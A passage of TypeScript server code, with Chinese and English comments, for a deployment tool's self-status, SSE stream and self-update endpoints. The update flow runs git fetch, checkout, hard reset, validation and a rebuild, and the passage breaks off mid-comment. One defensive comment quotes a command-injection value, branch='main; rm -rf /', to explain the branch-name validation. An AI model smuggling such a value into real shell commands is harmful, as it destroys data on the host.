  // 「CDS 系统设置 → 维护」面板原本只能看「当前分支 + commit」,不知道
  //   - GitHub 上当前分支有没有比本地新的 commit(我该不该手动跑 self-update?)
  //   - 上次系统更新发生在什么时候,谁触发的,成功还是失败
  //
  // 这个端点把这两件事一次性返回。前端拿到后渲染两个 chip(remote-ahead /
  // last update)+ 一个历史抽屉,无需多次轮询。
  //
  // 注意:`git fetch` 会真的发网络请求,带 10s 超时;远端不可达时优雅降级
  // 到 cached(用 `--cached` 不会触发 fetch)。
  //
  // 2026-05-05 改造(事件驱动):去掉 60s in-process 缓存,改为
  //   - 每次 ?probe=remote 诚实查询(GlobalUpdateBadge 不再轮询,只在
  //     SSE 断开等少数 case 才会主动调本端点)
  //   - 新增 GET /api/self-status/stream SSE 长连接,把 push webhook
  //     触发的状态变化主动推给前端
  // 把 selfStatusContext 注册到模块级,broadcastSelfStatus() 才能用同一份
  // 闭包重新计算 payload。
  selfStatusContext = {
    repoRoot: config.repoRoot,
    shell,
    stateService,
    gitAuthEnvProvider: async (repoRoot: string) => (await gitAuthForRepo(repoRoot)).env,
  };

  // 2026-05-28: 把 cache 与现有 computeSelfStatusPayload + scanRemoteBranchesFromGit
  // 绑定,启动 bus → 旧 SSE 客户端池的桥接。后续所有 /api/self-status,
  // /api/self-branches, GET /api/cds-events 都走 cache。
  // 总是重新 init —— createBranchRouter 在测试环境会多次创建,
  // 让每个新 router 拿到自己的 computeSnapshot / scanRemoteBranches 闭包。
  // 生产环境 CDS 单进程单实例,init 在 server.ts startup 时只跑一次。
  {
    selfStatusCache.init({
      computeSnapshot: async ({ skipFetch }) => {
        const ctx = selfStatusContext;
        if (!ctx) throw new Error('selfStatusContext missing');
        const payload = await computeSelfStatusPayload(ctx, { skipFetch });
        // computeSelfStatusPayload 返回宽松的 Record<string, unknown>;cache 期望
        // 严格类型,这里走 unknown 中转 cast — 字段对齐由 computeSelfStatusPayload
        // 内部保证(都是已知字段名集合)。
        return payload as unknown as Awaited<
          ReturnType<Parameters<typeof selfStatusCache.init>[0]['computeSnapshot']>
        >;
      },
      scanRemoteBranches: scanRemoteBranchesFromGit,
    });
    installLegacyStreamBridge();
    // 把 self-status snapshot 变化投影成 self.update.{started,step,done,failed}
    // 事件,送进同一个 bus,供 /api/cds-events 订阅方使用。
    installSelfUpdateEventProjector();
    // 注意:cache 启动后**不**主动跑 readSnapshotWithFallback。
    // 第一次 GET /api/cds-events 订阅时由 cache.enqueueRefresh('stream-subscribe')
    // 触发,或者 webhook / POST /api/self-refresh 显式触发。
    // 避免在没人订阅时白白扫 git + 干扰 vitest 里测无关端点的 mock.commands 期望。
  }

  router.get('/self-status', async (req, res) => {
    // 2026-05-28 重构:本端点(挂在 /api router 内,server.ts 顶层未抢答的情况)
    // 永远从 selfStatusCache 读快照 — 不再同步触发 git fetch。
    //
    // 兼容 ?probe=remote=force 旧语义:触发后台 refresh job,但仍立刻返回当前快照
    // (而不是阻塞等 git fetch)。前端如要实时观察 refresh 进度,订阅
    // /api/cds-events 的 self.refresh.* 事件 + 最终 self.status snapshot。
    //
    // 永不抛 4xx/5xx;失败保留 lastKnownGood 兜底。
    const wantsRemoteProbe = req.query.probe === 'remote';
    if (wantsRemoteProbe) {
      // 触发后台 refresh,不阻塞响应。dedupe 由 cache 自己处理(同 trigger 5s 内合并)。
      selfStatusCache.enqueueRefresh('manual');
    }
    const snapshot = selfStatusCache.getSnapshot();
    const lastKnownGood = selfStatusCache.getLastKnownGood();
    // 如果当前 snapshot 是 EMPTY(cache 还没跑过任何 refresh)+ 有 lastKnownGood,
    // 优先返 lastKnownGood;否则返当前 snapshot(可能是空的兜底)。
    const usingLastKnownGood = !snapshot.lastRefreshAt && !!lastKnownGood;
    const payload = usingLastKnownGood ? lastKnownGood : snapshot;
    res.json({
      ...payload,
      // 旧 client 还依赖 `degraded: { reasons: [...] }` 形状;cache 用 `degraded: {reason}`。
      // 这里同时给两个,保持兼容。
      degraded: payload.degraded
        ? { degraded: true, reason: payload.degraded.reason, message: payload.degraded.message, reasons: [payload.degraded.message] }
        : null,
      lastKnownGood: usingLastKnownGood ? { fromTs: lastKnownGood?.lastRefreshAt } : null,
    });
  });

  // GET /api/self-update-history — 完整历史(含每条 record 的完整 SSE 步骤序列)
  //
  // /api/self-status 默认 includeSteps=false 来减小 payload(每条记录 50 行 ×
  // 20 条 = 80KB+)。前端"历史抽屉"打开时主动调本端点拉完整版,带 limit=20
  // 控制返回条数。
  router.get('/self-update-history', (req, res) => {
    let limit = 20;
    const raw = String(req.query.limit ?? '');
    if (raw) {
      const n = parseInt(raw, 10);
      if (Number.isFinite(n) && n >= 1 && n <= 100) {
        limit = n;
      }
    }
    try {
      const records = stateService.getSelfUpdateHistory(limit, { includeSteps: true });
      res.json({ records, limit });
    } catch (err) {
      res.status(500).json({ error: (err as Error).message });
    }
  });

  // GET /api/self-status/stream — SSE 长连接,事件驱动推送 self-status
  //
  // 2026-05-05:取代 GlobalUpdateBadge 的 30s 轮询(每次都触发 git fetch
  // → 5-10s 慢操作 → 页面卡)。客户端连上后:
  //   1. 立即收到 `event: snapshot` 首屏数据(用本地 cached refs,不发网络)
  //   2. 后续 GitHub push webhook 命中本机当前分支时,服务端主动推
  //      `event: update`(那时才走真实 git fetch)
  //   3. 每 25s 一条 `event: keepalive` 防 nginx 60s 超时把连接断掉
  //
  // 鉴权沿用 router 上的 auth middleware(本路由器的所有 GET 都已过 auth)。
  router.get('/self-status/stream', async (req, res) => {
    // SSE 标准头部(同 initSSE,但显式写一遍以贴近 SSE 契约)
    res.writeHead(200, {
      'Content-Type': 'text/event-stream',
      'Cache-Control': 'no-cache',
      Connection: 'close',
      'X-Accel-Buffering': 'no',
    });
    // 立刻 flush 头(部分代理需要)
    if (typeof (res as { flushHeaders?: () => void }).flushHeaders === 'function') {
      (res as { flushHeaders: () => void }).flushHeaders();
    }

    // 1) 首屏 snapshot:用本地 cached refs(不触发 git fetch,首屏要快)。
    //    只是初始数据;后续靠 webhook 触发的 update 事件保持新鲜。
    //
    // 警告 Bugbot Review 2026-05-06: snapshot 必须**先于** add(res) 写入,否则
    // 在 computeSelfStatusPayload 异步期间如果发生 broadcastSelfStatus()
    // (push webhook 触发),client 会先收到 update 再收到 snapshot,违反
    // SSE 协议契约 (snapshot = "Initial cached state on connection")。
    try {
      const snapshot = await computeSelfStatusPayload(
        {
          repoRoot: config.repoRoot,
          shell,
          stateService,
          gitAuthEnvProvider: async (repoRoot: string) => (await gitAuthForRepo(repoRoot)).env,
        },
        { skipFetch: true },
      );
      res.write(`event: snapshot\ndata: ${JSON.stringify(snapshot)}\n\n`);
    } catch (err) {
      // snapshot 失败也不挂断 — 客户端会等下一个 update/keepalive
      // eslint-disable-next-line no-console
      console.warn('[self-status/stream] snapshot 失败:', (err as Error).message);
    }

    // 2) snapshot 写完才加进客户端池,确保事件顺序 snapshot → update → keepalive
    //
    // 警告 Bugbot Review 2026-05-06 a105ae91: 客户端在 await 期间断开时
    // req.on('close') 已经触发但 selfStatusClients 还没包含 res, delete
    // 形同 no-op。await 完后再 add(res) 把死客户端加进池, 启动的
    // setInterval 会一直 keepalive 直到第一次 res.write 失败 (~25s) 才清。
    // 加 req.destroyed 守卫立刻 return, 避免给死客户端起 keepalive。
    if (req.destroyed) {
      // 警告 Bugbot 2026-05-06 a9793a4a:res.writeHead 已写头,半开响应应显式 end()
      // 兜底,即使底层 socket 已 destroy,Express 内部状态也干净下来。
      try { res.end(); } catch { /* ignore */ }
      return;
    }
    selfStatusClients.add(res);

    // 警告 Bugbot 2026-05-06 d7db4dba + d19e3cf1:snapshot 用 skipFetch=true 避免
    // 连接被 git fetch 阻塞,代价是 fetchOk=false / remoteAheadCount 走 cached refs
    // (可能 stale)。原方案 broadcastSelfStatus() 会把 update 推给**所有**客户端
    // → 多 tab 时每开一个新 tab,旧 tab 都收到一条冗余 update + git fetch 也跑一次。
    // 改成只给**当前新连接**真 fetch 一次推 update,不打扰别的 client。
    void (async () => {
      // 警告 Bugbot 2026-05-06 9514bd0b:正在 broadcast 时本 client 跳过 per-client
      // update — broadcast 会推到整个 selfStatusClients 池(本 res 已在池里),
      // 避免 snapshot → broadcast update → per-client update 的三连闪烁。
      if (broadcastInFlight) return;
      try {
        const payload = await computeSelfStatusPayload(
          {
            repoRoot: config.repoRoot,
            shell,
            stateService,
            gitAuthEnvProvider: async (repoRoot: string) => (await gitAuthForRepo(repoRoot)).env,
          },
          { skipFetch: false },
        );
        // 期间客户端可能断开 / 主动关 / broadcast 抢先了
        if (req.destroyed || !selfStatusClients.has(res) || broadcastInFlight) return;
        res.write(`event: update\ndata: ${JSON.stringify(payload)}\n\n`);
      } catch (err) {
        // eslint-disable-next-line no-console
        console.warn('[self-status/stream] 首屏 fresh fetch 失败,下一条 webhook update 会兜底:', (err as Error).message);
      }
    })();

    // 3) 25s keepalive,防 nginx/中间代理 60s 闲置超时 cut 连接
    const keepalive = setInterval(() => {
      try {
        res.write(`event: keepalive\ndata: ${JSON.stringify({ ts: new Date().toISOString() })}\n\n`);
      } catch {
        clearInterval(keepalive);
        selfStatusClients.delete(res);
      }
    }, 25_000);

    // 4) 客户端断开时清池(server-authority.md:断开只清池,不取消任何
    //    git/db 操作 — 本路由也没启动任何长任务,纯被动等推送)
    req.on('close', () => {
      clearInterval(keepalive);
      selfStatusClients.delete(res);
    });
  });

  // POST /api/self-update — switch branch + pull + restart CDS (SSE progress)
  router.post('/self-update', async (req, res) => {
    // 2026-05-08:同 self-force-sync,body.force=true 跳过同 commit 的 no-op
    // fast-path,让"重复测试同一版本更新"成为可能。详见 self-force-sync 上方注释。
    let { branch, force } = req.body as { branch?: string; force?: boolean };
    const forceMode = force === true;
    const restartDrainTimeoutMs = resolveRestartDrainTimeoutFromRequest(req.body);

    initSSE(res);
    // 2026-05-07 actor 真名修复(用户反馈"七八轮还是 actor: unknown"):
    //   - GitHub auth 模式下 github-auth.ts middleware 把登录用户贴在
    //     (req as any).cdsUser.githubLogin
    //   - basic auth 模式下 server.ts 走 makeToken,没有 req.cdsUser,
    //     fallback 到 actor-resolver 返 'user' / 'ai:xxx' / 'ai'
    //   - 都没命中才退回到 'unknown'(此时多半是 dev 模式 auth=disabled)
    const cdsUser = (req as { cdsUser?: { githubLogin?: string; login?: string; username?: string } }).cdsUser;
    const actor =
      cdsUser?.githubLogin ||
      cdsUser?.login ||
      cdsUser?.username ||
      resolveActorFromRequest(req) ||
      'unknown';

    branch = typeof branch === 'string' ? branch.trim() : '';
    if (!branch) {
      try {
        const currentBranch = (await shell.exec('git rev-parse --abbrev-ref HEAD', { cwd: config.repoRoot }))
          .stdout.trim();
        branch = currentBranch && currentBranch !== 'HEAD' ? currentBranch : 'main';
      } catch {
        branch = 'main';
      }
    }

    const existingActive = stateService.getActiveSelfUpdate();
    if (isSelfUpdateBusy(existingActive)) {
      const message = `已有更新正在进行(${existingActive?.trigger || 'unknown'} · ${existingActive?.step || 'starting'}),本次请求已拒绝以避免并发构建串台`;
      stateService.appendSelfUpdateLog('warning', `[concurrency] ${message} actor=${actor}`);
      void broadcastSelfStatus().catch(() => { /* best-effort UI sync */ });
      sendSSE(res, 'error', { message, activeSelfUpdate: existingActive });
      res.end();
      return;
    }
    if (existingActive) stateService.clearSelfUpdateActive();

    // 2026-05-13 复查用结构化耗时:每个 step 独立计时,最后落到 history.timings。
    const startedAt = Date.now();
    const timingRecorder = createSelfUpdateTimingRecorder(startedAt);

    // 2026-05-07 状态落盘(用户反馈"卡 web-build 看不见状态"):
    // markSelfUpdateActive 现在写 .cds/active-update.json(SSOT),包含
    // pid + lastTickAt + logTail + interrupted。重启后新进程读盘恢复,
    // 不再"凭空消失"。
    stateService.markSelfUpdateActive({
      startedAt: new Date().toISOString(),
      branch: branch || '',
      trigger: 'manual',
      actor,
    });
    void broadcastSelfStatus().catch(() => { /* best-effort UI sync */ });
    const send = (step: string, status: string, title: string) => {
      timingRecorder.mark(step, status);
      sendSSE(res, 'step', { step, status, title, timestamp: new Date().toISOString() });
      // 同步 step + 顺手写一条 logTail,让前端面板看到具体阶段。
      // status='error' / 'warning' 时 log level 跟随,前端按颜色渲染。
      const level: 'info' | 'warning' | 'error' =
        status === 'error' ? 'error' : status === 'warning' ? 'warning' : 'info';
      stateService.updateSelfUpdateStep(step, { level, logText: `[${step}] ${title}` });
      void broadcastSelfStatus().catch(() => { /* best-effort UI sync */ });
    };

    // 2026-05-04 流水记录:从开头捕获 fromSha + start time,所有 abort 路径
    // 在 sendSSE('error',...) 后 recordSelfUpdate({status:'failed', ...}),
    // success 路径在「即将 process.exit」前 record({status:'success',...}).
    // 失败也写进流水,这样运维 lookup「上次失败是为啥」直接看历史。
    let fromSha = '';
    try {
      fromSha = (await shell.exec('git rev-parse --short HEAD', { cwd: config.repoRoot }))
        .stdout.trim();
    } catch { /* tolerated — 极少数情况下 fromSha=''仍可继续 */ }
    const recordFailure = (errMsg: string): void => {
      stateService.recordSelfUpdate({
        ts: new Date().toISOString(),
        branch: branch || '',
        fromSha,
        toSha: fromSha,                    // failed → no shift
        trigger: 'manual',
        status: 'failed',
        durationMs: Date.now() - startedAt,
        error: errMsg.slice(0, 300),
        actor,
        timings: timingRecorder.snapshot(),
      });
    };
    const recordSelfUpdate = (record: Omit<import('../types.js').SelfUpdateRecord, 'timings'>): void => {
      stateService.recordSelfUpdate({
        ...record,
        timings: timingRecorder.snapshot(),
      });
    };

    try {
      const repoRoot = config.repoRoot;

      // Step 1: fetch latest
      send('fetch', 'running', '正在拉取远程更新...');
      const fetchAuth = await gitAuthForRepo(repoRoot);
      const fetchRes = await shell.exec('git fetch --all --prune', { cwd: repoRoot, env: fetchAuth.env, timeout: 60_000 });
      if (fetchRes.exitCode !== 0) {
        const errMsg = (combinedOutput(fetchRes) || 'git fetch --all --prune 失败').trim();
        send('fetch', 'error', `拉取远程更新失败: ${errMsg.slice(0, 240)}`);
        sendSSE(res, 'error', {
          message: `拉取远程更新失败: ${errMsg.slice(0, 500)}`,
          authSource: fetchAuth.source,
          projectId: fetchAuth.projectId,
        });
        res.end();
        recordFailure(`git fetch 失败: ${errMsg}`);
        return;
      }
      send('fetch', 'done', '远程更新已拉取');

      // Step 2: switch branch if specified
      if (branch) {
        // Defense-in-depth: even though /api/self-update sits behind
        // cookie/AI-key auth, an authenticated user supplying
        // `branch='main; rm -rf /'` would otherwise run arbitrary
        // commands. Reject shell-unsafe refs before they reach
        // `shell.exec()`.
        if (!isSafeGitRef(branch)) {
          send('checkout', 'error', `拒绝不安全分支名: ${branch.slice(0, 80)}`);
          sendSSE(res, 'error', { message: `不合法的分支名: ${branch}` });
          res.end();
          recordFailure(`不合法的分支名: ${branch}`);
          return;
        }
        send('checkout', 'running', `正在切换到分支 ${branch}...`);
        // Use -f to discard tracked-file changes (safe: untracked files like .cds/state.json are untouched)
        const checkoutResult = await shell.exec(`git checkout -f ${branch}`, { cwd: repoRoot });
        if (checkoutResult.exitCode !== 0) {
          // Try creating tracking branch from remote
          const fallbackResult = await shell.exec(`git checkout -f -b ${branch} origin/${branch}`, { cwd: repoRoot });
          if (fallbackResult.exitCode !== 0) {
            const errMsg = (fallbackResult.stderr || fallbackResult.stdout || '未知错误').trim();
            send('checkout', 'error', `切换分支失败: ${errMsg}`);
            sendSSE(res, 'error', { message: `无法切换到 ${branch}: ${errMsg}` });
            res.end();
            recordFailure(`切换分支失败: ${errMsg}`);
            return;
          }
        }
        // Verify the checkout actually worked
        const verifyResult = await shell.exec('git rev-parse --abbrev-ref HEAD', { cwd: repoRoot });
        const actualBranch = verifyResult.stdout.trim();
        if (actualBranch !== branch) {
          send('checkout', 'error', `切换失败: 期望 ${branch}，实际仍在 ${actualBranch}`);
          sendSSE(res, 'error', { message: `分支切换未生效: 仍在 ${actualBranch}` });
          res.end();
          recordFailure(`分支切换未生效: 仍在 ${actualBranch}`);
          return;
        }
        send('checkout', 'done', `已切换到 ${branch}`);
      }

      // 2026-05-04 fix:fetch 之后先校验 origin/<target> ref 存在,
      // 避免 reset 失败时报英文 git stack trace。常见场景:用户上次
      // self-update 切到了某个 feat 分支,后来该分支合并 main 后被
      // 自动删 head ref,此时 cds.miduo.org 的 HEAD 是 stale,reset 必报
      // "ambiguous argument" 错误。给个友好提示 + 建议切到 main。
      if (branch) {
        const refCheck = await shell.exec(
          `git rev-parse --verify --quiet origin/${branch}`,
          { cwd: repoRoot },
        );
        if (refCheck.exitCode !== 0) {
          const msg =
            `远端分支 origin/${branch} 不存在或已被删除。` +
            `请改选 main 或别的活分支(可在「目标分支」下拉重选)。` +
            `如果你刚把分支合并到 main 后被自动删,选 main 即可。`;
          send('checkout', 'error', msg);
          sendSSE(res, 'error', { message: msg, suggestedFallback: 'main' });
          res.end();
          recordFailure(`origin/${branch} 不存在`);
          return;
        }
      }

      // #746 guard #2 — 分支新鲜度警告(非阻断)。
      // 落后 main 太多的分支 self-update 容易撞上 lockfile 漂移 / 陈旧配置
      // (2026-06-08 一次事故的诱因)。这里只**警告**不阻断:真正的"装不上/起不来"
      // 由 guard #3(boot install smoke)在 swap 前兜住;此处给操作者早期可见性。
      if (branch && branch !== 'main') {
        try {
          const behindRaw = (await shell.exec(
            `git rev-list --count origin/${branch}..origin/main`,
            { cwd: repoRoot },
          )).stdout.trim();
          const behind = Number.parseInt(behindRaw, 10);
          if (Number.isFinite(behind) && behind >= 50) {
            send(
              'checkout',
              'warning',
              `分支落后 origin/main ${behind} 个提交 — 陈旧分支更易撞 lockfile/配置漂移。` +
                `建议先 rebase 到 main。本次仍会继续(由 boot 预检兜底),仅提醒。`,
            );
          }
        } catch {
          /* 新鲜度检查失败不影响 self-update */
        }
      }

      // Step 3: hard-reset local to the remote tip.
      //
      // Prior implementation used `git pull` which creates a merge commit
      // when the local branch has diverged from origin. In managed CDS
      // deployments divergence happens easily (e.g. a prior self-update
      // left a locally-committed state, or the operator ran git commands
      // on the host). An auto-merge can silently drop file changes — we
      // actually hit this: settings.js grew by 438 lines on origin but
      // pull's merge kept the local OLD version, serving stale UI.
      //
      // origin is the source of truth for a managed deployment, so we
      // hard-reset to `origin/<branch>` after fetch. This is destructive
      // to local uncommitted changes (checkout -f above already discards
      // those) and to local-only commits (which shouldn't exist on a
      // prod CDS anyway). For manual debugging branches, operators can
      // still use `git reflog` to recover.
      send('pull', 'running', '正在硬对齐到远端最新...');
      const targetBranch = branch || (await shell.exec('git rev-parse --abbrev-ref HEAD', { cwd: repoRoot })).stdout.trim();
      // Guard the fallback branch too — a corrupted HEAD state could
      // theoretically return something shell-unsafe (unlikely but the
      // check costs nothing).
      if (!isSafeGitRef(targetBranch)) {
        send('pull', 'error', `拒绝不安全分支名: ${targetBranch.slice(0, 80)}`);
        sendSSE(res, 'error', { message: `不合法的 target branch: ${targetBranch}` });
        res.end();
        recordFailure(`不合法的 target branch: ${targetBranch}`);
        return;
      }
      // 2026-05-04 v5 fix(用户反馈"更新时间太长 + 没自动刷新"):
      // **no-op 短路** — HEAD 已经等于 origin/branch + web build 已是最新 →
      // 跳过整个 validate + restart 链路,直接返回 'no-op' SSE 事件 ~1 秒结束。
      // 否则 same-commit 触发会白跑 70+ 秒(validate cold install)。
      const headFullSha = (await shell.exec('git rev-parse HEAD', { cwd: repoRoot })).stdout.trim();
      const remoteFullSha = (await shell.exec(`git rev-parse origin/${targetBranch}`, { cwd: repoRoot })).stdout.trim();
      const noopWebShaPath = path.join(repoRoot, 'cds', 'web', 'dist', '.build-sha');
      let noopWebSha = '';
      try {
        if (fs.existsSync(noopWebShaPath)) noopWebSha = fs.readFileSync(noopWebShaPath, 'utf8').trim();
      } catch { /* ignore */ }
      const noopErrorMarker = path.join(repoRoot, 'cds', 'web', 'dist', '.build-error');
      const noopHasBuildError = fs.existsSync(noopErrorMarker);
      // 2026-05-04 v6 fix:noopWebSha 用 startsWith 容忍 short/full sha 都能匹配。
      // 老的 in-process build 代码(720e47b 之前)写的是 short sha(8 字符),
      // 新代码(6b1af19+)写 full sha(40 字符)。startsWith 兜底两种都行 ——
      // 否则 production 升级到 6b1af19 后第一次 no-op 会因为 .build-sha 还是
      // 老 short sha 而失败,需要再跑一次完整 build 才能进 no-op 路径,卡 1 轮。
      const webShaMatchesHead =
        noopWebSha &&
        headFullSha &&
        (noopWebSha === headFullSha ||
          (noopWebSha.length >= 7 && headFullSha.startsWith(noopWebSha)));
      if (
        headFullSha &&
        remoteFullSha &&
        headFullSha === remoteFullSha &&
        webShaMatchesHead &&
        !noopHasBuildError &&
        !forceMode
      ) {
        const shortHead = headFullSha.slice(0, 8);
        send('pull', 'done', `HEAD 已是 origin/${targetBranch} (${shortHead})`);
        send('no-op', 'done', `检测到 no-op:HEAD/web bundle 都已是最新,跳过 validate/restart`);
        sendSSE(res, 'done', { message: `已是最新版本 (${shortHead}),无需重启` });
        res.end();
        // 流水里也记一条,用 trigger='manual' status='success' duration=极短
        recordSelfUpdate({
          ts: new Date().toISOString(),
          branch: branch || '',
          fromSha,
          toSha: shortHead,
          trigger: 'manual',
          status: 'success',
          durationMs: Date.now() - startedAt,
          actor,
        });
        return;
      }

      const resetResult = await shell.exec(
        `git reset --hard origin/${targetBranch}`,
        { cwd: repoRoot },
      );
      if (resetResult.exitCode !== 0) {
        const errMsg = (resetResult.stderr || resetResult.stdout || '未知错误').trim();
        send('pull', 'error', `硬对齐失败: ${errMsg}`);
        sendSSE(res, 'error', { message: `无法对齐到 origin/${targetBranch}: ${errMsg}` });
        res.end();
        recordFailure(`硬对齐失败: ${errMsg}`);
        return;
      }
      const newFullHead = (await shell.exec('git rev-parse HEAD', { cwd: repoRoot })).stdout.trim();
      const newHead = newFullHead.slice(0, 8);
      send('pull', 'done', `已对齐到 origin/${targetBranch} @ ${newHead}`);

      // B'.5.1 hotfix(2026-05-08):git reset 后主动跑 nginx-render,让 host 上
      // cds-site.conf 切到新 nginx 模板(带 include cds-active-upstream.conf)。
      // 否则 host 文件永远停留在改造前的 inline 写法,蓝绿 nginx-validate 一直
      // 报 "host not found in upstream cds_master"(冒烟反复发现的根因)。
      // 失败容忍 — render_nginx 偶发失败不该阻塞 self-update 主流程,bootstrap
      // 兜底 docker cp 即可让 nginx 容器看到 host 文件。
      try {
        const renderRes = await shell.exec('./exec_cds.sh nginx-render', {
          cwd: path.join(repoRoot, 'cds'),
          timeout: 15_000,
        });
        if (renderRes.exitCode === 0) {
          send('nginx-render', 'done', 'nginx 模板已重新渲染');
        } else {
          send('nginx-render', 'warning', `nginx-render exit=${renderRes.exitCode}: ${(renderRes.stderr || renderRes.stdout || '').slice(0, 200)}`);
        }
      } catch (err) {
        send('nginx-render', 'warning', `nginx-render 异常(忽略,继续): ${(err as Error).message}`);
      }

      // * Phase A 零停机前端更新 (2026-05-08):同 self-force-sync,改动全部落在
      // cds/web/src/** 时跳过后端 esbuild + 跳过 systemd 重启,**只**重 web/dist。
      // self-update 历史上没做 impact 分析,Phase A 把它也接进来 —— 用户改前端
      // 文案点 self-update 不再需要等 70-90s 重启。
      // 详见 doc/report.cds.self-update-timing-audit.md Phase A。
      let suChangedPaths: string[] = [];
      let suDiffOk = false;
      if (fromSha && isSafeGitRef(fromSha)) {
        try {
          const diffRes = await shell.exec(
            `git diff --name-only ${fromSha}..HEAD`,
            { cwd: repoRoot, timeout: 15_000 },
          );
          if (diffRes.exitCode === 0) {
            suChangedPaths = diffRes.stdout.split('\n').map((s) => s.trim()).filter(Boolean);
            suDiffOk = true;
          }
        } catch { /* tolerate */ }
      }
      const suImpact = analyzeChangeImpact(suChangedPaths);
      // Bug O fix(2026-05-10) — force=true 时跳过 web-only fast-path,强制走完
      // validate + 后端 build + systemd restart。
      // 用户传 force 的语义是"我要看 daemon 真重启了 + uptime 归零",任何 fast
      // path 都该绕开 — 否则用户改了 .ts push 后 force,看见 200 OK 但进程还是
      // 老代码,无法判断"我提交的改动有没有进 production"。
      if (!forceMode && suDiffOk && isWebOnlyChange(suImpact, suChangedPaths)) {
        send('analyze', 'done', `本次改动 ${suChangedPaths.length} 文件全部在 cds/web/src/** — 走零停机前端更新路径(跳过 validate / 后端 build / systemd 重启)`);
        try {
          timingRecorder.merge(await runInProcessWebBuild(newHead, send, res));
        } catch (webBuildErr) {
          recordFailure(`web-only build 失败: ${(webBuildErr as Error).message}`);
          return;
        }
        const webElapsed = Math.floor((Date.now() - startedAt) / 1000);
        send('web-only', 'done', `cds/web/dist 已重建到 ${newHead} (${webElapsed}s) — daemon 不重启,前端立即生效`);
        sendSSE(res, 'done', {
          message: `零停机前端更新完成 (${webElapsed}s) — HEAD=${newHead},刷新页面即看到新版`,
          commitHash: newHead,
          mode: 'web-only',
          webOnlyFiles: suChangedPaths.length,
        });
        res.end();
        recordSelfUpdate({
          ts: new Date().toISOString(),
          branch: branch || '',
          fromSha,
          toSha: newHead,
          trigger: 'manual',
          status: 'success',
          durationMs: Date.now() - startedAt,
          actor,
          ...({ updateMode: 'web-only' } as Record<string, unknown>),
        });
        return;
      }

      let updateMode: 'restart' | 'prebuilt' = 'restart';
      let prebuiltApplied = false;
      if (!forceMode) {
        const prebuiltStart = Date.now();
        const prebuilt = await tryApplyCdsPrebuiltForSelfUpdate({
          shell,
          repoRoot,
          targetFullSha: newFullHead,
          send,
        });
        timingRecorder.merge({ prebuiltMs: Date.now() - prebuiltStart });
        if (prebuilt.applied) {
          prebuiltApplied = true;
          updateMode = 'prebuilt';
          try {
            const renderRes = await shell.exec('./exec_cds.sh nginx-render', {
              cwd: path.join(repoRoot, 'cds'),
              timeout: 15_000,
            });
            if (renderRes.exitCode === 0) {
              send('nginx-render', 'done', 'nginx 模板已用预构建 dist 重新渲染');
            } else {
              send('nginx-render', 'warning', `nginx-render(prebuilt dist) exit=${renderRes.exitCode}: ${(renderRes.stderr || renderRes.stdout || '').slice(0, 200)}`);
            }
          } catch (err) {
            send('nginx-render', 'warning', `nginx-render(prebuilt dist) 异常(忽略,继续): ${(err as Error).message}`);
          }
        } else if (prebuilt.reason && prebuilt.reason !== 'prebuilt disabled or target sha invalid') {
          send('prebuilt', 'warning', `未命中极速版,回退本机编译: ${prebuilt.reason.slice(0, 240)}`);
        }
      }

      if (!prebuiltApplied) {
      // ──────────────────────────────────────────────────────────────
      // Step 3.5: pre-restart validation (P4 Part 18 hardening).
      //
      // The previous self-update killed the running process BEFORE
      // validating that the new code could even start. When Phase D.1
      // added a new npm dep (mongodb) AND I introduced an ESM
      // require() bug, the result was a dead CDS that couldn't be
      // recovered via its own API — a bootstrap trap. This step
      // runs pnpm install + tsc --noEmit inside the current process
      // BEFORE kill+spawn. If anything fails, we abort the restart,
      // leave the running process alive, and surface the error via
      // SSE so the operator knows what to fix.
      // ──────────────────────────────────────────────────────────────
      const cdsDirForCheck = path.join(repoRoot, 'cds');
      send('validate', 'running', '正在校验依赖与编译（pnpm install + tsc --noEmit）...');
      // SSE 心跳:validate 在 cold install 时可达 1-2 分钟,cloudflare 100s 切流。
      const validateStart = Date.now();
      let validateHeartbeatLabel = '预检';
      const validateHeartbeat = setInterval(() => {
        const elapsed = Math.floor((Date.now() - validateStart) / 1000);
        sendSSE(res, 'validate-tick', { elapsed, message: `${validateHeartbeatLabel} · 已运行 ${elapsed}s` });
        // 同 web-build-tick:刷 lastTickAt + 写 logTail,前端面板能看到进度。
        stateService.tickSelfUpdate();
        stateService.appendSelfUpdateLog('info', `${validateHeartbeatLabel} · 已运行 ${elapsed}s`);
      }, 15_000);
      let validation: Awaited<ReturnType<typeof validateBuildReadiness>>;
      try {
        validation = await validateBuildReadiness(shell, cdsDirForCheck, {
          onProgress: (event) => {
            validateHeartbeatLabel = event.message;
            sendSSE(res, 'validate-progress', {
              phase: event.phase,
              status: event.status,
              title: event.message,
              ...(event.timings || {}),
            });
            send(event.phase, event.status, event.message);
          },
        });
      } finally {
        clearInterval(validateHeartbeat);
      }
      timingRecorder.mergeValidation(validation.timings);
      // 把验证阶段每段实际耗时喷到 SSE 'timings' 事件,用户在弹窗里就能看到真实
      // 毫秒(不靠估算)。fast-path 命中的段会带 _skipped=1 标记,前端可以直接
      // 渲染"install_cds: 42ms (skip) · install_web: 678ms · tsc_cds: 80ms (skip)..."
      // self-update.js 已经在 onmessage 里 dump 所有 event 到 statusEl。
      const timingSummary = formatValidationTimings(validation.timings);
      sendSSE(res, 'timings', {
        phase: 'validate',
        title: `预检耗时: ${timingSummary}`,
        ...validation.timings,
      });
      send('validate-timings', 'info', `预检耗时: ${timingSummary}`);
      if (!validation.ok) {
        send('validate', 'error', `预检失败: ${validation.error}`);
        sendSSE(res, 'error', {
          message: `self-update 已中止 — 新代码未通过预检: ${validation.error}`,
          stage: validation.stage,
          hint: '原 CDS 进程保持运行中。修复后请重新触发 self-update。',
        });
        res.end();
        // Aborted (vs failed) — 验证失败,旧进程仍在跑,流水标 'aborted'
        // 让运维一眼区分「网络/git 出问题失败」vs「代码问题安全中止」。
        recordSelfUpdate({
          ts: new Date().toISOString(),
          branch: branch || '',
          fromSha,
          toSha: fromSha,
          trigger: 'manual',
          status: 'aborted',
          durationMs: Date.now() - startedAt,
          error: `预检失败 (${validation.stage}): ${(validation.error || '').slice(0, 250)}`,
          actor,
        });
        return;
      }
      send('validate', 'done', `预检通过: ${validation.summary}`);
      // 前端 tsc 失败时只 warn,不阻断。让用户知道 web bundle 不会跟着更新。
      if (validation.webWarning) {
        send('web-warning', 'warning', validation.webWarning.slice(0, 400));
      }

      // 2026-05-07 关键修复(用户反馈"修了七八轮,connections/issue 永远 404"):
      // self-update 切完 git + validate(--noEmit) 通过后,**必须**重编 cds/dist/。
      // systemd ExecStart=master-run 不跑 tsc(只 pnpm install 后 exec node),
